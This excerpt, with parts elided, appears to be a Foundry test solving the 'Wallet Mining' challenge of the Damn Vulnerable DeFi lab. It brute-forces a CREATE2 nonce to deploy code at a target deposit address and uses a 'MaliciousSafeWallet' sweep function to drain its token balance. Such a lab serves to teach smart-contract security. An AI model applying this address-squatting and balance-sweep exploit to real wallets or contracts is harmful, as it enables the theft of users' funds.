...
contract WalletMiningChallenge is Test {
    ...
    function test_walletMining() public checkSolvedByPlayer {
        ...
        MaliciousSafeWallet maliciousSafeWallet = new MaliciousSafeWallet();

        bytes memory initData = abi.encodeWithSelector(
            MaliciousSafeWallet.sweep.selector,
            address(token),
            address(maliciousSafeWallet)
        );

        uint256 nonce;
        bool success = false;
        while (!success) {
            address result = vm.computeCreate2Address(
                keccak256(abi.encodePacked(keccak256(initData), nonce)),
                keccak256(
                    abi.encodePacked(
            ...
            if (result == USER_DEPOSIT_ADDRESS) {
                success = true;
            } else {
                nonce++;
            }
        }
        walletDeployer.drop(USER_DEPOSIT_ADDRESS, initData, nonce);
    }
...
contract MaliciousSafeWallet {
    function sweep(address token, address to) external {
        uint256 balance = DamnValuableToken(token).balanceOf(address(this));
        DamnValuableToken(token).transfer(to, balance);
    }
}
